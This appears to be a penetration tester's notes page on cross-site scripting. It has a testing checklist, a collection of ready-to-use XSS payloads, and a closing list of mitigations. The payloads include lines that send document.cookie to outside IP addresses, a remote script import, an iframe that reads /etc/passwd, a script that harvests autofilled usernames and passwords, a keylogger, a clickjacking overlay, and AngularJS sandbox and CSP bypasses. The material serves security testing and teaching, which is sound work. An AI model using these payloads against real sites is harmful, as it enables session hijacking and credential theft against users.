---
title: "XSS"
layout: notes
tags:
  - webapp
  - methodology
  - xss
  - FI_parameters
  - FI_user-input
  - FI_account-registration
  - Co_xss
---
## Summary

Web applications at their core need some framework to run and execute code to create dynamic webpages. The language of choice for most of these frameworks ends up being JavaScript. As with anything that contains an underlying technology it is important to keep in mind how that backend tech will interact with supplied user-data. This is where JavaScript Injection, or XSS, comes into play. With some ingenuity and grit an XSS payload can be created to bypass even decent protections under the right circumstances and run JavaScript code in various locations. 

Where JS can be ran is dependent on the type of XSS being exploited. The three basic ones break down into Reflected, Stored, and DOM. Reflected is only client side through the web browser and requires a link to be visited for exploitation. Stored places the payload on the server to execute for all visiting a page. DOM targets the Document Object Model of JS and seeks to exploit code locally running in the browser. The severity of an XSS vulnerability is dependent both on the type of XSS it is as well as the popularity or functions of the endpoint itself. XSS after all can only perform actions a user could and access information a user can access, so an anonymous note taking app having XSS is likely to have low impact. 

Getting deeper into the topic there are specific renderers such as jQuery and AngularJS which have specific exploits to bypass sandboxes or exploit code within the framework. Content Security Policy can be added for an additional layer of complexity for bypassing. A `Content-Security-Policy` can define self or a domain to accept scripts and images from. There could be a nonce present that is required to be in a tag or a hash of the script in question to prevent tampering. CSP presents a whole host of protections to bypass and some imagination is needed to properly navigate it.

## Methodology

When looking for XSS ask/try the following:
- [ ] **Is there anything reflected or stored I have control over?**
	- [ ] check parameters and values, user profile fields, etc..
	- [ ] add a random character string and grep for them
	- [ ] look for modules that grab information from other sites or sources (ie twitter scraper)
	- [ ] **What relationship does the info I put in have with the output?**
	- [ ] **What is the end data type of the input I can control?**
- [ ] **Does this webapp have any sensitive information or functions?**
- [ ] **Is there an admin portal?**
- [ ] check if any headers are reflected on the page
	- [ ] think about if headers might be reflected on the backend
		- [ ] make a simple img src as your server for blind XSS and if it ever fires off note that down
- [ ] check if any tags can be injected and rendered as tags
- [ ] **Are there any sinks for DOM XSS to be possible?**
	- [ ] look for scripts within the page
	- [ ] might need to induce an error in the code to check how the argument forms
		- [ ] source code might not properly tell how it's being filtered or processed
	- [ ] try using DOM invader to place a string and search it in sinks
	- [ ] if sink is `innerHTML`, `img` and `iframe` with onload and onerror work over `script` or `svg`
- [ ] **Is the webapp using jQuery?**
	- [ ] check for an `attr()` with a parameter you control
	- [ ] look for `$()` as jQuery's selector function
	- [ ] check any autoscroll function for `location.hash`
		- [ ] hashchange event handler was vulnerable 
		- [ ] try adding `<iframe src="URL/#" onload="this.src+='<img src=1 onerror=print()>'">`
- [ ] **Is the webapp using AngularJS?**
	- [ ] ng-app HTML element can execute inside of `{{}}`
		- [ ] `{{constructor.constructor('alert(1)')()}}`
	- [ ] SANDBOX BYPASSING
		- [ ] leverage client side template injection
		- [ ] `charAt()` can be overwritten with `[].join` to trick `isIdent()` into improperly reading strings
		- [ ] urlencode key characters to prevent a WAF or cache or other from misinterpreting it
- [ ] **Is the webapp using VueJS?**
	- [ ] if a way can be found to reload the templating script it will reparse the html, including templates
	- [ ] default templates are `{{7*7}}` can be redefined elsewhere
- [ ] **Is there a Content Security Policy?**
	- [ ] try using an img to exfiltrate tokens
	- [ ] if `report-uri` is present try injecting own directives
		- [ ]  `;script-src-elem 'unsafe-inline'`
- [ ] check for any canonical links that you control
	- [ ] [https://portswigger.net/research/xss-in-hidden-input-fields](https://portswigger.net/research/xss-in-hidden-input-fields)
	- [ ] can use `accesskey` to define a key combo to execute the XSS 
- [ ] check for any template literals or backticks
	- [ ] can use `${}` within backticks
- [ ] try adding `javascript:print()` in link fields
	- [ ] if `javascript:name` is all you can get try using an iframe to load the page then defining name
		- [ ] `<iframe name="<img src='' onerror=alert(document.domain)>" src=https://example.com/index.php?url=javascript:name>`
- [ ] try substituting a POST for a GET w/ parameters in URL
- [ ] fuzz for what characters are allowed
	- [ ] start encoding if they cause problems, HTML encoding for HTML and Unicode for JavaScript
		- [ ] [https://www.compart.com/en/unicode/U+FF1E](https://www.compart.com/en/unicode/U+FF1E) for unicode
	- [ ] `//` can be used instead of `>`
	- [ ] `';alert(1)//` and `'-alert(1)-'` can be used if breaking string literals
	- [ ] `\` can be used if characters are being escaped
	- [ ] if `>` is filtered try to use tags like svg to get around closing tags
	- [ ] `/**/` can be used as a space
	- [ ] try parameter pollution to smuggle in filtered characters if parameter based
	- [ ] if parenthesis are filtered `throw` can be used
		- [ ] `onerror=alert;throw 1`  `{onerror=alert}throw 1`
		- [ ] [https://portswigger.net/research/xss-without-parentheses-and-semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
- [ ] try breaking out of an event or tag (be sure to close certain tags)
- [ ] can you comment out parts of the html with `//` or `/**/`
- [ ] is there a size limit to the filter or checks
- [ ] can you add an `<svg/onload=eval(uri)>` on an existing variable you control
- [ ] try adding duplicates of filtered symbols
- [ ] check the CSP with [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/)
- [ ] fuzz for what tags are allowed
	- [ ] [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
	- [ ] try capitalizing tags
	- [ ] this.style.ELEMENT can be used in lieu of style tags
		- [ ] can also be chained with attributes to exploit XSS
	- [ ] add tags without closing tags to see how they interact with the webpage
		- [ ] some tags encompass others or filter tags entirely, can be used to remove parts of html
		- [ ] select and option are a way to remove and strip tags from where the tag is defined to page end
- [ ] fuzz for what events are allowed
	- [ ] can combo onload `id=x` and `#` on a src/href if onerror isn't available
	- [ ] if href is explicitly disallowed can use `svg` and `animate` to define attributeName as href
	- [ ] `x=x=>{alert(1)}` can be used to define a functions then call is after defining it
		- [ ] toString can be redefined to x, concatenating window can call toString

## Capabilities

XSS  
Webapp Capabilities  

## Found In

User Input  
Parameters  
Account Registration  

## Tools/Examples

[https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
[https://developer.mozilla.org/en-US/docs/Web/API/Location#wikiArticle](https://developer.mozilla.org/en-US/docs/Web/API/Location#wikiArticle)
[https://appsecexplained.gitbook.io/appsecexplained/common-vulns/injection/javascript-injection-xss/xss-methodology](https://appsecexplained.gitbook.io/appsecexplained/common-vulns/injection/javascript-injection-xss/xss-methodology)


classics
```
"><u>test123
<u/onmouseover-alert(1)>test123
print()
<svg/onload=alert(1)>
<link rel="canonical" accesskey="X" onclick="alert(1)" />
<img src=x onerror=this.src="http://192.168.2.50:8080/?"+document.cookie;>
<script>document.location='http://10.10.14.5/?'+document.cookie</script>
<iframe src=file:///etc/passwd width=1000px height=1000px></iframe>
<a href="http://"onmouseover="prompt(1);">
<img src=1 onerror=alert(1)>
<img src=x onerror='eval(atob(""))'>
<script src=data:text/javascript,alert(1)></script>
<img src=x onerror=import('https://mysite.com/1.js')>
```

exploiting src in tags
```
<script/src=data:,alert()>
<script src="data:text/javascript,alert(1)"></script>
```

sinks to DOM-XSS
```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
location.search
window.location
```

jQuery sinks to DOM-XSS
```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads)

basic requests
```
let xhr = new XMLHttpRequest()
xhr.open('GET','http://website.com',true)
xhr.send('email=update@email.com')

fetch('http://website.com')
```

generic form submitting
```
<script>
var csrfToken = document.getElementsByName('csrf')[0].value;

var data = new FormData();
data.append('csrf', csrfToken);
data.append('postId', 6);
data.append('comment', `${username}:${password}`);
data.append('name', 'victim');
data.append('email', 'test@test.com');
data.append('website', 'https://test.com');

fetch('/post/comment', {
	method: 'POST',
	mode: 'no-cors',
	body: data
});
</script>
```

grabbing autofill passwords
```
<input type="text" name="username">
<input type="password" name="password" onchange="csrf()">

<script>
function csrf() {
var csrfToken = document.getElementsByName('csrf')[0].value;
var username = document.getElementsByName('username')[0].value;
var password = document.getElementsByName('password')[0].value;

var data = new FormData();
data.append('csrf', csrfToken);
data.append('postId', 6);
data.append('comment', `${username}:${password}`);
data.append('name', 'victim');
data.append('email', 'test@test.com');
data.append('website', 'https://test.com');

fetch('/post/comment', {
	method: 'POST',
	mode: 'no-cors',
	body: data
});
}
</script>
```

clickjacking
```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:470px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://cybercherney.github.io/"></iframe>
```

keylogging
```
document.onkeypress = function(e) {
 get = window.event ? event : e
 key = get.keyCode ? get.keyCode : get.charCode
 key = String.fromCharCode(key)
 console.log(key)
}
```

#### Mitigation

Filter input when it is received  
Encode data on output  
Html should be converted to HTML entities `<` => `&lt;`  
Javascript should be Unicode-escaped `<` => `\u003c`  
When embedding user input inside an event handler unicode-escape then html-encode  
Validate on arrival  
Things like protocol, data types, and allowed characters  
Use whitelists not blacklists of the above  
Use DOMPurify to filter and encode within the browser if users need HTML markup (not a full solution)  
Evaluate escapes of templating engines in use  
Use appropriate response headers  
Be sure to specify accepted `Content-Type` and `X-Content-Type`  
Framekiller JS breaks out of iframes  
`Content-Security-Policy` (CSP) headers reduce severity:  
`default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';`  
X-Frame-Options to specify what origins are allowed to embed  
DENY or SAMEORIGIN prevents controlled sites from clickjacking/ iframe  



